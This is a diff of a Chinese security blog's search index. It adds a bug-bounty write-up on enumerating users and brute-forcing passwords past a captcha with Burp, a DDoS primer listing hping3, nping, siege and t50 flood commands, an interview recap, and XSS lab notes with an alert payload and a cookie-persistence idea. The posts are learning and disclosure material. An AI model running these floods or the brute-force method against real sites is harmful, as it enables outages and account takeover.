@@ -1,6 +1,182 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>【漏洞挖掘】某站绕过验证码实现用户枚举+密码爆破</title>
+    <url>/2020/05/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91%E6%9F%90%E7%AB%99%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇为前几日所挖Web漏洞记录，图中将抹去真实地址，已提交src，过程仅供学习参考。</p>
+<a id="more"></a>
+
+
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>该漏洞发现于某商场注册功能处。先通过正常流程注册一个测试账号，账号aaaa1234  密码aaaa1234。</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/注册.png">
+
+<p>开burp，挂代理，再次注册，抓包，可以得到注册的请求数据包。如图</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/注册抓包.png">
+
+<p>将此包发送到intruder模块，此时不要forward即可保留验证码的时效性，forward后爆破时会提示验证码过期。<br>在intruder模块中我选择了username和email两个参数进行爆破，在此之前通过验证得出如果email已被注册则不论用户名是否存在，都会优先提示“emai已被注册”，所以将email也加入变量。<br>用户名字典就使用常见的字典，然后在其中添加测试号保证最终结果的准确性<br>email字典是我写了一个python脚本生成的随机邮箱字典</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatFile</span><span class="params">(array)</span>:</span></span><br><span class="line">    filename = <span class="string">'RandomEmail.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> array:</span><br><span class="line">            file.write(j + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatRndomEmail</span><span class="params">()</span>:</span></span><br><span class="line">    email_end = (<span class="string">'@qq.com'</span>)</span><br><span class="line">    email_array = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        email_start = random.randint(<span class="number">12001</span>,<span class="number">95126445</span>)</span><br><span class="line">        email = str(email_start) + email_end</span><br><span class="line">        email_array.append(email)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> email_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    CreatFile(CreatRndomEmail())</span><br></pre></td></tr></table></figure>
+
+<p>start，可见枚举结果，其中length为263时都是提示用户名已存在：</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/枚举.png">
+
+<p>将已存在用户名导出到txt，可作为之后爆破密码的字典使用，可以看见测试账号也在其中，说明结果准确</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/枚举结果.png">
+
+<p>通过绕过验证码获得了已存在的用户，再前往登录页面进行密码爆破</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/登录.png">
+
+<p>输入登录信息后，用将拦截下来的请求包发送至intruder，同样的此时不能将该包forward<br>在intruder模块中对username和password两个变量进行爆破。username字典使用刚才枚举出的结果，password字典可以使用常用弱口令字典。</p>
+<img src="/2020/05/15/【漏洞挖掘】某站绕过验证码实现用户枚举-密码爆破/爆破结果.png">
+<p>可以看见length为217的结果，页面都会返回登录成功，此处只有一个账号成功，就是之前注册的测试账号aaaa1234 ，已经可以确认漏洞存在。<br>至于更多的账号或者密码则可以使用更强大的字典，然此处仅做测试，勿要违法。</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li>从注册处可以添加手机短信验证码注册，并设置发送验证码的时间间隔</li>
+<li>限制同一IP在单位时间内的请求次数</li>
+<li>不论是注册处还是登陆都应该增加token和验证码的时效性</li>
+<li>对于页面返回，尽量保证回显一致</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AboutDDOS</title>
+    <url>/2020/05/13/AboutDDOS/</url>
+    <content><![CDATA[<h1 id="DOS-DDOS分类"><a href="#DOS-DDOS分类" class="headerlink" title="DOS/DDOS分类"></a>DOS/DDOS分类</h1><pre><code>攻击源 
+    • 单攻击源：DOS
+    • 多攻击源：DDOS
+攻击方式
+    • 消耗资源
+    • 利用漏洞
+攻击目标
+    • 带宽上限
+    • 协议上限
+    • 设备性能上限
+    • 应用性能上限
+    • 系统性能上限
+    • 崩溃系统
+    • 崩溃程序</code></pre><a id="more"></a>
+
+<h1 id="常见DOS-DDOS方式"><a href="#常见DOS-DDOS方式" class="headerlink" title="常见DOS/DDOS方式"></a>常见DOS/DDOS方式</h1><h2 id="Smurf"><a href="#Smurf" class="headerlink" title="Smurf"></a>Smurf</h2><p>利用ping广播,将广播回复地址设置成攻击目标地址，从而当前网段下所有主机都会向其回复一个响应信息，导致网络阻塞。<br>如今，大多数网络已经对smurf攻击免疫。</p>
+<h2 id="TearDrop"><a href="#TearDrop" class="headerlink" title="TearDrop"></a>TearDrop</h2><p>在数据传输过程中，如果一个数据过大，则数据传输会进行数据包的截断。会对截断位置进行一个标记，等待数据传输完再通过标记对数据进行拼接，从而传输完整的数据。使用TearDrop可以修改数据截断中的标记位置，从而利用截断的偏移让目标死机蓝屏 。<br>TearDrop只针对老系统如win95，安卓2.0，ios6.0等。虽然TearDrop这种攻击已经过时了，但是攻击方式独特，仍有学习的意义。</p>
+<h2 id="Syn-flood"><a href="#Syn-flood" class="headerlink" title="Syn_flood"></a>Syn_flood</h2><p>建立一个完整的TCP连接，需要完成一个“三次握手与四次挥手”。在这个过程中，如果向目标请求TCP连接，发送syn包，目标回复后我们不再回复，则对方的TCP连接状态会暂时处于等待回复状态一段时间后才断开，在这段时间里，攻击方请求大量的TCP连接，发送大量的syn包而不对目标的TCP回复进行响应，则对方会有大量TCP连接处于等待回复状态，从而导致对方网络带宽卡死。</p>
+<h2 id="Sockstress"><a href="#Sockstress" class="headerlink" title="Sockstress"></a>Sockstress</h2><p>Sockstress攻击发生在建立完整的TCP连接之后。通过返回TCP包设定属性windows窗口值为0，即表示本机暂时没地方接受数据，让对方等待。发送大量该类型的包后对方主机会出现内存飙高，Cpu高占用等状态，从而卡死主机达到目的</p>
+<h2 id="DNS放大"><a href="#DNS放大" class="headerlink" title="DNS放大"></a>DNS放大</h2><p>DNS放大攻击通过伪造IP地址向DNS服务器做递归查询，从而DNS服务器向伪造的地址返回大量信息，导致伪造地址目标卡死。<br>DNS放大攻击的优势在与攻击方只需请求很小流量，DNS服务器就能向伪造地址返回大量流量，大大提高了攻击强度和攻击效率。<br>DNS放大攻击需要满足特定条件才能使用：</p>
+<ol>
+<li>所在网络支持伪造被攻击者IP地址</li>
+</ol>
+<ol start="2">
+<li>DNS服务器支持递归查询</li>
+</ol>
+<h2 id="SNMP放大"><a href="#SNMP放大" class="headerlink" title="SNMP放大"></a>SNMP放大</h2><p>SNMP放大也是放大攻击的一种，同样利用了小请求大回复的原理。通过伪造IP地址向SNMP服务器做查询，SNMP会返回大量信息到伪造的地址，从而让对方卡死。<br>常用端口161，162</p>
+<h2 id="NTP放大"><a href="#NTP放大" class="headerlink" title="NTP放大"></a>NTP放大</h2><p>NTP放大攻击同其余放大攻击原理大致相同，伪造IP地址向NTP服务器进行小流量请求，NTP服务器会向伪造地址放回大量信息。<br>NTP放大需要满足的条件：</p>
+<ol>
+<li>必须monlist开启</li>
+</ol>
+<ol start="2">
+<li>常用端口123</li>
+</ol>
+<p>NTP放大攻击的防御措施是：</p>
+<ol>
+<li>对NTP服务器进行合理的管理和配置，将全部的NTP服务软件升级到最新的版本；         4.2.7p26以上版本</li>
+</ol>
+<ol start="2">
+<li>关闭monlist或者在配置文件中添加noquery参数来限制客户端的monlist等信息查询请求</li>
+</ol>
+<ol start="3">
+<li>通过防火墙对UDP试用的123端口进行限制，只允许NTP服务于固定IP进行通信；</li>
+</ol>
+<ol start="4">
+<li>运用足够大的带宽，硬抗NTP服务产生的放大型流量攻击。</li>
+</ol>
+<ol start="5">
+<li>使用DDoS防御产品，将入口异常访问请求进行过滤清洗，然后将正常的访问请求分发给服务器进行业务处理。</li>
+</ol>
+<ol start="6">
+<li>发现漏洞:<br>ntpdc -n -c 1.1.1.1<br>ntpq -c rv 1.1.1.1<br>ntpdc -c sysinfo 1.1.1.1</li>
+</ol>
+<h1 id="应用层DOS"><a href="#应用层DOS" class="headerlink" title="应用层DOS"></a>应用层DOS</h1><h2 id="CesarFTP-0-99服务漏洞"><a href="#CesarFTP-0-99服务漏洞" class="headerlink" title="CesarFTP 0.99服务漏洞"></a>CesarFTP 0.99服务漏洞</h2><p>CesarFTP是一款免费FTP服务器端软件，体积小，随装随用，使用方便。<br>CesarFTP 0.99存在缓冲区一处漏洞，通过命令发送大量‘\n’（通过FUZZ测试得出）导致缓冲区溢出从而服务崩溃</p>
+<h1 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h1><h2 id="Slowhttptest"><a href="#Slowhttptest" class="headerlink" title="Slowhttptest"></a>Slowhttptest</h2><p>Slowhttptest是依赖HTTP协议的慢速攻击DoS攻击工具，设计的基本原理是服务器在请求完全接收后才会进行处理，如果客户端的发送速度缓慢或者发送不完整，服务端为其保留连接资源池占用，大量此类请求并发将导致DoS。<br>包含四种攻击方式</p>
+<ol>
+<li>Slowloris：完整的http请求是以\r\n\r\n结尾，攻击时仅发送\r\n，少发送一个\r\n，服务器认为请求还未发完，就会一直等待直至超时。等待过程中占用连接数达到服务器连接数上限，服务器便无法处理其他请求。 </li>
+</ol>
+<ol start="2">
+<li>Slow POST：在HTTP头申明较大content长度，body部分缓慢发送</li>
+</ol>
+<ol start="3">
+<li>Slow Read attack：请求正常发送，慢速读取响应数据，调整TCP连接中window窗口大小（ps：sockstress中将window调为0）</li>
+</ol>
+<ol start="4">
+<li>Apache Range Header attack：耗尽cpu，内存</li>
+</ol>
+<h2 id="RUDY（Are-u-dead-yet）"><a href="#RUDY（Are-u-dead-yet）" class="headerlink" title="RUDY（Are-u-dead-yet）"></a>RUDY（Are-u-dead-yet）</h2><p>慢攻击DOS<br>利用数据缓慢发送，耗尽目标资源。<br>针对Web，需要有一个表单提交的页面，每次发送一字节慢慢的发。类似于Slowhttptest<br>获取地址 <a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></p>
+<h2 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h2><p>hping是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。利用hping3中组合语法，可以达到DOS的效果</p>
+<ol>
+<li>Syn Flood:<pre><code>hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1
+hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></pre></li>
+<li>ICMP Flood: <pre><code>hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.1</code></pre></li>
+<li>UDP Flood: <pre><code>hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.1  </code></pre></li>
+<li>TCP Flood: <pre><code>hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></pre></li>
+<li>LAND攻击:<pre><code>特殊种类的SynFlood攻击，源地址和目标地址都是受害者 伪造的源地址和目标地址相同，伪造自己给自己发包，自己给自己回包，自己打自己
+Hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></pre></li>
+<li>TCP全连接DOS:<pre><code>nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></pre></li>
+<li>查公网IP<pre><code>nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></pre></li>
+</ol>
+<h2 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h2><p>siege是一款针对Web http/https性能测试的一款工具，可以用来进行DOS<br>siege -g <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a>  /  1.1.1.1<br>siege -i -c 1000 <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a> -A<br>同时攻击多个URL，添加-f 使用字典文件，siege默认的字典/etc/siege/urls.txt</p>
+<h2 id="T50"><a href="#T50" class="headerlink" title="T50"></a>T50</h2><p>T50是对Web进行网络性能测试工具，可以用来进行DOS。参数可以指定各种网络协议，包括GRE、ICMP、TCP、UDP……<br>t50 1.1.1.1 –flood –turbo -S -protocol TCP –dport 80  (添加turbo参数将提高攻击能力)</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>知名网络扫描工具，其内也包含有DOS脚本，存放于 /usr/share/nmap/scripts/script.db</p>
+<h2 id="匿名者DOS工具"><a href="#匿名者DOS工具" class="headerlink" title="匿名者DOS工具"></a>匿名者DOS工具</h2><p>由世界知名黑客组织匿名者发布的DOS工具包，包括LOIC,HOIC,XOIC,DDoSer……<br>这些工具使用简单，图形化界面可指定攻击线程，目标地址，端口，攻击方式等等<br>但是都不支持代理，无法隐藏真实IP</p>
+<h2 id="HULK"><a href="#HULK" class="headerlink" title="HULK"></a>HULK</h2><p>HTTP Unberable Load King 是一款基于python的DOS工具，HULK随机产生大量唯一的地址请求，可以避免缓存命中，耗尽WEB服务器资源池。<br>源客户的混淆——通过一个User Agent的已知列表，每http一个请求的用户代理都是随机来自于已知列表。<br>引用伪装——指向请求的referer是伪造的，要么指向主机自己，要么指向主要的已知站点。referer是产生请求的url。<br>粘附性——使用标准的http请求去请求服务器，使用变化的的keep-alive时间窗保持连接建立不使用缓存——这是一个前提</p>
+<h2 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h2><p>GoldenEye是一款Layer 7拒绝服务测试工具，基于Python开发。利用的攻击向量：HTTP Keep Alive + NoCache。可指定参数：<br>-u：指定需要使用的user-agent列表文件（默认随机生成）；</p>
+<p>-w：指定并行worker数量（默认50）；</p>
+<p>-s：指定并行socket数量（默认30）；</p>
+<p>-m：指定使用的HTTP方法，“get“、”post“或”random“（默认get）；</p>
+<p>-d：启用调试模式，可输出更多的verbose内容（默认False）；</p>
+<p>-n：关闭SSL证书验证功能（默认True）；</p>
+<p>-h：查看帮助信息</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>DDOS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020.03.02深信服安服一面</title>
+    <url>/2020/03/02/2020-03-02%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%AE%89%E6%9C%8D%E4%B8%80%E9%9D%A2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>半个月前（2020.2.15）网申了深信服21届安服实习，今天一面结束，对提出的问题再做一下回顾和总结</p>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>1、网投简历<br>2、收到面试短信，约定面试时间<br>3、电话面试</p>
+<p>面试全程大概30min</p>
+<a id="more"></a>
+
+<h1 id="问题梳理"><a href="#问题梳理" class="headerlink" title="问题梳理"></a>问题梳理</h1><p><strong>1、自我介绍</strong><br>    略<br><strong>2、FTP传输一次要发出几个TCP连接？</strong><br>    FTP传输需要建立连个TCP连接。控制连接和数据连接</p>
+<p><strong>3、描述一下DNS解析过程？为什么要使用DNS?</strong><br>    ①浏览器将URL发送给DNS客户端（如本地pc），DNS客户端向DNS服务器发送一份包含域名的报文，DNS服务器根据域名查找对应IP然后返回给DNS客户端，DNS客户端发给浏览器对应的IP，浏览器向该IP发出连接。<br>    ②IP地址不好记，使用域名方便访问和记忆</p>
+<p><strong>4、HTTP协议中Referer字段的作用？</strong><br>    在HTTP头中Referer标识来源。第一 防盗链，限定Referer字段可以限制访问，比如只<br>    允许baidu.com访问自己的服务器，那么每次检测Referer只要不为baidu.com就拦截。<br>    第二 防止恶意请求，比如静态请求是*.html结尾的，动态请求是*.shtml，<br>    那么由此可以这么用，所有*.shtml请求，必须Referer为baidu.com</p>
+<p><strong>5、上一个回答提到了同源策略，什么是同源策略？为什么XSS不会触发同源策略？</strong><br>    ①同源策略是浏览器的功能，保障浏览安全，不同源的客户端在没有授权下，不能读取其资源。（ps：当时我在回答上个问题时有提到同源策略）<br>    ②有的标签是不受同源策略限制的比如&lt;img&gt;</p>
+<p><strong>6、DDOS的软件类型？DDOS原理？TCP DDOS时是什么连接状态？讲一下LOIC中的DDOS类型？服务器被DDOS后是什么样的状态。</strong><br>    ①基于IP、基于ARP、基于ICMP、基于TCP、基于UDP。（我觉得面试官可能想问DDOS的类型，当时没太听懂，就说了我用过LOIC，所以后面问了我LOIC）<br>    ②每种DDOS基本原理大多是利用大量的垃圾报文，垃圾数据传输到目标，导致系统拥塞迟缓<br>    ③TCP DDOS是利用TCP连接的三次握手，发送大量请求包，导致TCP的连接有大量包在等待回复，直到最后资源耗尽（个人理解）<br>    ④在我用的LOIC中，可以选择三种不同的DDOS连接 TCP\UDP\HTTP<br>    ⑤服务器被DDOS，可能出现卡顿、网络不通等情况，同时在网络数据中可以发现大量的垃圾数据包</p>
+<p><strong>7、如何判断XSS？哪些标签可以加载JS？哪些事件可以触发弹窗？内标签怎么闭合？</strong><br>    ①我的方法“见框就X”<br>    ②&lt;img&gt;,&lt;iframe&gt;,&lt;script&gt;,&lt;a&gt;(当时说了十几个还没让我停，醉了，估计是想看我极限吧)<br>    ③ alert,onerror,onmourse,onclick,confirm<br>    ④闭合前后尖括号，前后引号。还可以添加优先级高的标签在内部闭合。</p>
+<p><strong>8、Web漏洞中你擅长哪些？逻辑漏洞你是怎么挖掘的？给你一个注册页面，可能存在哪些逻辑漏洞？说说你见过最牛逼的逻辑漏洞？</strong><br>    ①逻辑漏洞（当时是逻辑漏洞）<br>    ②逻辑漏洞主要出现在注册，登录，修改信息，付款等地方，我会着重检查这几个点<br>    ③用户枚举，短信轰炸，任意密码找回，任意手机号注册……</p>
+<p><strong>9、给你一个网站进行渗透，说一下自己的渗透思路</strong><br>    先熟悉渗透目标，对目标公司进行基本信息查询，包括域名，资产，联系人等。社工可以用到<br>    再对目标进行指纹扫描，可以得到中间件，服务器，框架，cms等信息<br>    进入到主页面大致浏览主要业务模块，简单测试XSS，CSRF，SSRF等。接着更深一步我会从后台入手，进行注入、弱口令测试，如果进入到后台就找上传点Geshell。如果没进入后台，我会从其他方面入手。比如CMS版本漏洞，eweb、fck编辑器漏洞，中间件漏洞等</p>
+<p><strong>10、你参加过强网杯和红帽杯，说说比赛中你做出来的印象最深的题</strong><br>    这两个比赛我参加时，没有让我眼前一亮的题目，可能是能力有限这些题对我来说只有难度上的区别，但是我在平时刷题时有遇见让我印象深刻的题目。<br>    这是一道隐写题，首先通过解密图片获取Web地址下载得到俩压缩包，通过题目信息猜出其中一个解压密码，解压出来一音频文件，通过音频频谱高低得到摩斯密码，解摩斯密码得到另一个压缩文件密码，另一个压缩文件中包含四个图片，通过stegsolve处理后并拼接四个图片得到一个二维码，扫描二维码得到flag.<br>    这道题刷新了我对CTF的认知，让我对CTF正视起来。</p>
+<p><strong>11、你是怎样学习安全的？你今后会想往哪方面学习和发展</strong><br>    主要通过网络课程自学安全，然后有问题就在小圈子里问大佬。<br>    零碎的时间会看安全公众号以及VX\QQ群获取新的资讯。<br>    干货一点的知识我主要通过加入大佬的知识星球，多看看别人的经验<br>    此外会刷一些靶场，自己动手简单测试一些小站，复现一些漏洞<br>    这些平时的学习我会做一个系统的分类的笔记，慢慢的点满自己的技能树<br>    在Web安全有一定实力后，我有往内网渗透方面发展的意向</p>
+<p><strong>12、你还有什么想问的？</strong><br>    略</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在面试之前有拜托别人问一下深信服安服的实习面试会考察什么，说的是弄懂XSS,CSRF，SQL注入基本原理等大部分Web安全漏洞原理就没问题。那我就想没啥问题了呀。<br>我自己的弱项就是网络协议，很怕被问到这方面，不过虽然没明确说要考察网络协议，但是心里还是得有点B数。所以临时又补充看了一些，但还是答的不好。<br>让我没想到的是，问了DDOS。好在之前玩过，有一些基础，不然一问三不知太尴尬了。<br>最后结束的时候我还是提了一个问题，我说我以上的问题我哪些回答的不好，我的个人水平应该继续怎么提升？面试官还是很不错的，之前我在回答的时候没说上来的，说的不好的他都当场帮助我指正了，感激！然后最后他说我的网络协议不太好（我自己也清楚），此外对于Web漏洞这一块我回答的太浅显了，理解的不够深入，可能是实战经验少的原因。<br>那这样一说我也猜想没多大可能了，事实也如此。虽然一面没过，但是更加清楚了自己目前的问题，又明确了新的方向。</p>
+<p>有遗憾，有收获，挺好。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一些python练习小例</title>
     <url>/2020/02/13/%E4%B8%80%E4%BA%9Bpython%E7%BB%83%E4%B9%A0%E5%B0%8F%E4%BE%8B/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇将陆续上传一些平时的python小练习，小算法，都是可执行源码</p>
@@ -68,7 +244,7 @@
 <p>输入正确的用户名密码进入后台，此时url变为/admin/cms_welcome.asp</p>
 <img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg3.PNG">
 
-<p>可以发现登录成功后，后台管理页面为cms_welcome.asp ，每次管理员登录后台都一定会加载这个页面，如果已经获取了Webshell，那么在cms_welcome.asp 中加入JS 获取当前cookie并返回结果，每次管理员登录时都一定会加载插入的JS，就可以保持cookie的更新，从而维持权限。</p>
+<p>可以发现登录成功后，后台管理页面为cms_welcome.asp，每次管理员登录后台都一定会加载这个页面，如果已经获取了Webshell，那么在cms_welcome.asp 中加入JS 获取当前cookie并返回结果，每次管理员登录时都一定会加载插入的JS，就可以保持cookie的更新，从而维持权限。</p>
 <p>对于返回cookie我们可以利用XSS平台模块获取信息。</p>
 <img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg4.PNG">
 
@@ -86,9 +262,9 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>Web渗透</tag>
-        <tag>Xss</tag>
+        <tag>Web</tag>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -137,9 +313,9 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>Web渗透</tag>
         <tag>漏洞</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -217,10 +393,10 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
+        <tag>漏洞</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
-        <tag>漏洞</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -425,10 +601,10 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -532,16 +708,56 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </tags>
   </entry>
   <entry>
-    <title>DOM型XSS靶场探究</title>
-    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%89%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-XSS-DOM型"><a href="#DoraBox-XSS-DOM型" class="headerlink" title="DoraBox_XSS DOM型"></a>DoraBox_XSS DOM型</h1><h4 id="什么是DOM型XSS"><a href="#什么是DOM型XSS" class="headerlink" title="什么是DOM型XSS"></a>什么是DOM型XSS</h4><p>个人认为，如果将XSS分为两类，那么反射型XSS和存储型XSS是第一类，DOM型XSS是第二类。DOM型XSS区别于前两类的在于，DOM型XSS是基于<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/1033822?fr=aladdin&fromtitle=DOM&fromid=50288" target="_blank" rel="noopener">DOM文档对象</a>的一种漏洞，它不依赖于服务器的数据，而是从客户端获得DOM中的数据并在本地执行。</p>
+    <title>XSS_DoraBox靶场</title>
+    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现，</p>
+<p>这里使用DoraBox探究XSS漏洞</p>
 <a id="more"></a>
+<h1 id="DoraBox-XSS-反射型"><a href="#DoraBox-XSS-反射型" class="headerlink" title="DoraBox_XSS 反射型"></a>DoraBox_XSS 反射型</h1><h2 id="什么是反射型XSS"><a href="#什么是反射型XSS" class="headerlink" title="什么是反射型XSS"></a>什么是反射型XSS</h2><p>作为DoraBox第一次的XSS漏洞练习，先看一下什么是XSS：</p>
+<p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">XSS(Cross-site Scripting)</a>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序(来源百度百科)</p>
+<p>我所理解的反射型XSS是XSS的一种， 是即时性XSS。在满足条件时，即时触发，下一次需要再次部署payload</p>
+<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对反射型XSS是这样定义的：</p>
+<p><a href="http://www.ttlsa.com/safe/xss-description/" target="_blank" rel="noopener">反射型跨站脚本（Reflected Cross-site Scripting）</a>也称非持久型，参数型跨站脚本。这类跨站脚本是做常见的，主要是将恶意脚本附加到URL地址参数中。反射型XSS的利用一般是攻击者通过特殊的手法（比如利用电子邮件），诱使用户点击这些特定链接时，恶意的JavaScript代码会直接在受害者主机上执行。他的特点是指在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
+<h2 id="观察环境"><a href="#观察环境" class="headerlink" title="观察环境"></a>观察环境</h2><p>进入XSS环境，根据先前对反射型XSS的描述（将恶意脚本附加到URL地址参数），这提醒我们可以先观察URL是否满足条件。</p>
+<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg2.PNG" title="timg">
 
-<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>同样的，先构造payload尝试</p>
-<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（三）/timg1.PNG" title="timg">
+<p>可以看见，红色箭头指向的地方，在URL中出现了submit提交的name参数(红色箭头指向)</p>
+<h2 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>构造payload提交 ，此payload的效果是弹窗</p>
+<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre>{% asset_img timg1.PNG timg %}
+
+<p>执行成功，同时可以看见URL中 name参数 变成了我们的payload。当我们对弹框点击确定后，XSS消失。观察前端源码可以发现我们的payload</p>
+{% asset_img timg4.PNG timg %}
+
+<p>不难理解，反射型XSS就是通过提交恶意代码让浏览器执行一次，从而达到我们需要的目的。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在2019年OWASP Top10中，XSS位列第三，可见XSS在Web安全漏洞中的重要地位。</p>
+<p>小插曲：我被自己XSS了！</p>
+<p>前文写到的payload，因为要在本地localhost刷新，看完最终效果后我才会上传文章<br>，就在刚才写完准备检查一遍的时候，我惊了。</p>
+{% asset_img timg3.PNG timg %}
+
+
+<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h2 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h2><p>我个人对存储型XSS的理解，反射型XSS即时执行一次，而存储型XSS在满足触发条件后执行，就像埋了个地雷。</p>
